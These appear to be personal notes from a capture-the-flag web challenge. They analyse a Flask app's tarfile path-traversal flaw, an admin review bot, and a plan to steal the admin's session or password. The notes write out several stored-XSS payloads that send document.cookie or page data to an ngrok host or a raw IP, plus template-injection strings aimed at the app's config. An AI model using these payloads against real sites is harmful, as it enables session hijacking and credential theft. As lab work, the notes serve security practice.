
134\.209\.22\.191:31193

\<script\>document\.location='[https://3e1b-216-93-199-231.ngrok.io/?c='+document.cookie;</script>](#https://3e1b-216-93-199-231.ngrok.io/?c='+document.cookie;</script>)



**Looked at the code, noticed a couple things**: **\(Lets work our way backwards from potential compromise:**

**Looks like I want to use a tarfile with some \.\./\.\. paths to do some directory traversal, hopefully this would work\.\.
**[https://github.com/ptoomey3/evilarc](#https://github.com/ptoomey3/evilarc)


def extract\_firmware\(file\):
tmp  = tempfile\.gettempdir\(\)
path = os\.path\.join\(tmp, file\.filename\)
file\.save\(path\)

if tarfile\.is\_tarfile\(path\):
tar = tarfile\.open\(path, 'r:gz'\)
tar\.extractall\(tmp\)

rand\_dir = generate\(15\)
extractdir = f"\{current\_app\.config\['UPLOAD\_FOLDER'\]\}/\{rand\_dir\}"

**So, to do this, maybe I would need to login as admin\. **

\</nav\>
\<div class="container" style="margin\-top: 20px"\> \{% for report in reports %\} \<div class="card"\>
\<div class="card\-header"\> Reported by : \{\{ report\.reported\_by \}\}
\</div\>
\<div class="card\-body"\>
\<p class="card\-title"\>Module ID : \{\{ report\.module\_id \}\}\</p\>
\<p class="card\-text"\>Issue : \{\{ report\.issue | safe \}\} \</p\>
\<a href="#" class="btn btn\-primary"\>Reply\</a\>
\<a href="#" class="btn btn\-danger"\>Delete\</a\>

**This is what the admin can see\.  He bots to it in the code\.  I need to get him to read my report and XSS him hopefully so I can get to the firmware upload page\.
**
**Looked at the docker starting up, noticed a couple things:
**
Stored in directory: /root/\.cache/pip/wheels/bd/be/27/f4c42e0a9e52b316b05cd1203c375c16782f416dc8153fb755
Successfully built SQLAlchemy\-serializer SQLAlchemy cffi
Installing collected packages: sortedcontainers, certifi, Werkzeug, urllib3, sniffio, PySocks, pycparser, MarkupSafe, itsdangerous, idna, h11, greenlet, click, cachelib, attrs, async\-generator, wsproto, SQLAlchemy, outcome, Jinja2, cffi, trio, SQLAlchemy\-serializer, Flask, cryptography, trio\-websocket, pyOpenSSL, Flask\-SQLAlchemy, Flask\-Session, Flask\-Login, selenium
Successfully installed Flask\-2\.1\.2 Flask\-Login\-0\.6\.1 Flask\-SQLAlchemy\-2\.5\.1 Flask\-Session\-0\.4\.0 Jinja2\-3\.1\.2 MarkupSafe\-2\.1\.1 PySocks\-1\.7\.1 SQLAlchemy\-1\.4\.36 SQLAlchemy\-serializer\-1\.4\.1 Werkzeug\-2\.1\.2 async\-generator\-1\.10 attrs\-21\.4\.0 cachelib\-0\.7\.0 certifi\-2021\.10\.8 cffi\-1\.15\.0 click\-8\.1\.3 cryptography\-37\.0\.2 greenlet\-1\.1\.2 h11\-0\.13\.0 idna\-3\.3 itsdangerous\-2\.1\.2 outcome\-1\.1\.0 pyOpenSSL\-22\.0\.0 pycparser\-2\.21 selenium\-4\.1\.5 sniffio\-1\.2\.0 sortedcontainers\-2\.4\.0 trio\-0\.20\.0 trio\-websocket\-0\.9\.2 urllib3\-1\.26\.9 wsproto\-1\.1\.0
**SQLAlchemy \- maybe there is something to use there**?
OOH SQL Injection\.\.\. fixed in version 1\.3\.0b3\. That is super old, this is 1\.4\.36\.
**Nothing else of interest I don't think\.\.**

ENV PYTHONDONTWRITEBYTECODE=1
^^^ This just doesn't write pyc files

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

**So, I think I have a plan\.  I need to leak the Admin password

This means, I need to have him visit /review

Luckily, it looks like he does this for me:
**
client\.get\('[http://localhost:1337/')](#http://localhost:1337/')


username = client\.find\_element\_by\_id\('username'\)
password = client\.find\_element\_by\_id\('password'\)
login = client\.find\_element\_by\_id\('login\-btn'\)

username\.send\_keys\(current\_app\.config\['ADMIN\_USERNAME'\]\)
password\.send\_keys\(current\_app\.config\['ADMIN\_PASSWORD'\]\)
login\.click\(\)
time\.sleep\(3\)

client\.get\('[http://localhost:1337/review')](#http://localhost:1337/review')


**

I think for this, I need to be able to get the admin password with something like:


But I need to hold this in a javascript variable, then load the page

Something like :
username :

****\<div\>"test"\<div\>****



\<script\>d=document;d\.location='**[**https://216.93.199.231/?c='+d.cookie;</script>**](#https://3e1b-216-93-199-231.ngrok.io/?c='+document.cookie;</script>)
**

And then put this in the report maybe:
**
a\{\{config\.ADMIN\_PASSWORD\}\}a


**I need to report an issue, and get data into this template, probably via the username: 

**\{% for report in reports %\}
\{\{ report\.reported\_by \}\}
\{\{ report\.issue | safe \}\}

**This will be the cookie theft probably\.\.**


Hmm, idk maybe\. putting that huge javascript in my name doesn't seem to do it\.

**
**
await fetch\(\`/api/$\{intent\}\`, \{
method: 'POST',
headers: \{
'Content\-Type': 'application/json',
\},
body: JSON\.stringify\(data\),
\}\)
\.then\(\(response\) =\> response\.json\(\)
\.then\(\(resp\) =\> \{
card\.attr\("class", "alert alert\-danger"\);
if \(response\.status == 200\) \{
card\.attr\("class", "alert alert\-info"\);
if \(intent == 'login'\) \{
window\.location\.href = '/dashboard';
\} else \{
setTimeout\(\(\) =\> \{
window\.location\.href = '/'
\}, 1000\);
\}
\}
card\.text\(resp\.message\);
card\.show\(\);
\}\)\)


username:
\<div id="aa"\>\{\{config\.ADMINPASSWORD\}\}\</div\>
issue:
\<script\>document\.location='https://1\.2\.3\.4/?c='\+document\.getElementById\('aa'\);\</script\>
